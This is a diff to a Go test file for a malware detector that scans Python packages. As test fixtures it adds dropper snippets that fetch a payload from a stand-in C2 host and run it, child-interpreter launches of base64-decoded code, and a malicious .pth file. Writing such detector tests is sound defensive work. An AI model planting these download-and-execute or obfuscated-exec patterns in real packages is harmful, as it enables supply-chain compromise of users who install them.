@@ -1,6 +1,11 @@
 package pysource
 
-import "testing"
+import (
+	"fmt"
+	"strings"
+	"testing"
+	"time"
+)
 
 // TestScan_ObfuscatedExecKind verifies the bare-vs-coupled split on the
 // obfuscated decode-and-exec signal (detection-roadmap item 3). Bare
@@ -181,5 +186,98 @@ func TestScan_LegitStaysClean(t *testing.T) {
 		if r := Scan(files(fs)); r.Detected {
 			t.Errorf("%s: expected clean, got %s on %s", name, r.Kind, r.Detail)
 		}
+	}
+}
+
+// TestScan_DropperLaunches covers the launch shapes that evaded the detector
+// before v0.22.106 (F14): a top-level download-then-run and a child
+// interpreter fed decoded code. Hosts are defanged.
+func TestScan_DropperLaunches(t *testing.T) {
+	fire := map[string]struct{ body, kind string }{
+		"urlretrieve then python3 <file> (durabletask)": {
+			"import subprocess, urllib.request, platform\nif platform.system() == 'Linux':\n    try:\n        urllib.request.urlretrieve('https://c2.example.invalid/rope.pyz', '/tmp/managed.pyz')\n        subprocess.Popen(['python3', '/tmp/managed.pyz'], start_new_session=True)\n    except:\n        pass\n", "download_exec"},
+		"urlretrieve to a name, run with sys.executable": {
+			"import os, sys, subprocess, tempfile\nfrom urllib.request import urlretrieve\ndst = os.path.join(tempfile.gettempdir(), 'x.py')\nurlretrieve('https://c2.example.invalid/x', dst)\nsubprocess.Popen([sys.executable, dst])\n", "download_exec"},
+		"urlretrieve then run the binary itself": {
+			"import os, urllib.request\nurllib.request.urlretrieve('https://c2.example.invalid/b', '/tmp/.x')\nos.chmod('/tmp/.x', 0o755)\nos.system('/tmp/.x &')\n", "download_exec"},
+		"sys.executable -c decoded (litellm 1.82.7)": {
+			"import base64, subprocess, sys\nB = 'cHJpbnQoMSk='\nsubprocess.Popen([sys.executable, '-c', base64.b64decode(B).decode()], start_new_session=True)\n", "obfuscated_exec_bare"},
+		"child interpreter -c decoded inside a function (xinference 2.6.2)": {
+			"import base64, subprocess, sys\ndef _install():\n    subprocess.Popen([sys.executable, \"-c\", base64.b64decode(\"eA==\").decode()])\n_install()\n", "obfuscated_exec_bare"},
+	}
+	for name, c := range fire {
+		t.Run(name, func(t *testing.T) {
+			r := Scan(files(map[string]string{"pkg/__init__.py": c.body}))
+			if !r.Detected || r.Kind != c.kind {
+				t.Fatalf("got %+v, want kind %s", r, c.kind)
+			}
+		})
+	}
+	clean := map[string]string{
+		"setup.py fetches a build dep and untars it": "import subprocess, urllib.request\nurllib.request.urlretrieve('https://example.invalid/zlib.tar.gz', 'zlib.tar.gz')\nsubprocess.check_call(['tar', 'xzf', 'zlib.tar.gz'])\nfrom setuptools import setup\nsetup(name='x')\n",
+		"setup.py -c probe with a literal":           "import subprocess, sys\ninc = subprocess.check_output([sys.executable, '-c', 'import numpy; print(numpy.get_include())'])\n",
+		"download and run inside a function only":    "import subprocess, urllib.request\ndef fetch():\n    urllib.request.urlretrieve('https://example.invalid/t', '/tmp/t.py')\n    subprocess.call(['python3', '/tmp/t.py'])\n",
+		"urlretrieve with no launch":                 "import urllib.request\nurllib.request.urlretrieve('https://example.invalid/data.csv', 'data.csv')\n",
+		"run a different file than the one fetched":  "import subprocess, sys, urllib.request\nurllib.request.urlretrieve('https://example.invalid/d.json', 'd.json')\nsubprocess.check_call([sys.executable, 'build_helper.py'])\n",
+	}
+	for name, body := range clean {
+		t.Run("clean/"+name, func(t *testing.T) {
+			if r := Scan(files(map[string]string{"setup.py": body})); r.Detected {
+				t.Fatalf("false positive: %+v", r)
+			}
+		})
+	}
+}
+
+// TestScan_StrongestWins: a Dispositive shape is reported even when an
+// advisory rule fires first in the same file or in a shallower one, and a
+// .pth is scanned however many modules pad the package (review, v0.22.106).
+func TestScan_StrongestWins(t *testing.T) {
+	dropper := "import subprocess, urllib.request\nurllib.request.urlretrieve('https://c2.example.invalid/r.pyz', '/tmp/m.pyz')\nsubprocess.Popen(['python3', '/tmp/m.pyz'])\n"
+	evilPth := "import subprocess,sys;subprocess.Popen([sys.executable,'-c',__import__('base64').b64decode('eA==').decode()])\n"
+	decoy := "import base64\nexec(base64.b64decode('cGFzcw=='))\n"
+	cases := map[string]map[string]string{
+		"advisory decode-and-exec appended to the dropper": {"pkg/__init__.py": dropper + decoy},
+		"shallower advisory module beside a .pth":          {"a.py": decoy, "evil.pth": evilPth},
+		"advisory module at the root, dropper deeper":      {"a.py": decoy, "pkg/sub/__init__.py": dropper},
+	}
+	for name, fs := range cases {
+		t.Run(name, func(t *testing.T) {
+			if r := Scan(files(fs)); !r.Dispositive {
+				t.Fatalf("masked: %+v", r)
+			}
+		})
+	}
+	padded := map[string][]byte{"zz.pth": []byte(evilPth)}
+	for i := 0; i < maxFiles+50; i++ {
+		padded[fmt.Sprintf("a%04d.py", i)] = []byte("X = 1\n")
+	}
+	if r := Scan(padded); !r.Dispositive || r.Detail != "zz.pth" {
+		t.Fatalf(".pth pushed out of window by padding: %+v", r)
+	}
+	// The advisory kind is still reported when nothing stronger fires.
+	if r := Scan(files(map[string]string{"pkg/x.py": decoy})); !r.Detected || r.Dispositive {
+		t.Fatalf("advisory decode-and-exec: %+v", r)
+	}
+}
+
+// TestScan_LinearInFetchesAndLaunches: thousands of top-level urlretrieve
+// destinations and launch lines in one file. A regex per destination against
+// every launch line took 18 s here; one alternation is linear.
+func TestScan_LinearInFetchesAndLaunches(t *testing.T) {
+	var b strings.Builder
+	for i := 0; i < 4000; i++ {
+		fmt.Fprintf(&b, "urllib.request.urlretrieve(u, '/tmp/f%d')\n", i)
+	}
+	for i := 0; i < 4000; i++ {
+		fmt.Fprintf(&b, "subprocess.call(['tar', 'xf', '/tmp/g%d'])\n", i)
+	}
+	start := time.Now()
+	r := Scan(map[string][]byte{"pkg/__init__.py": []byte(b.String())})
+	if d := time.Since(start); d > 2*time.Second {
+		t.Fatalf("4k x 4k scan took %v", d)
+	}
+	if r.Detected {
+		t.Fatalf("no destination is run, got %+v", r)
 	}
 }
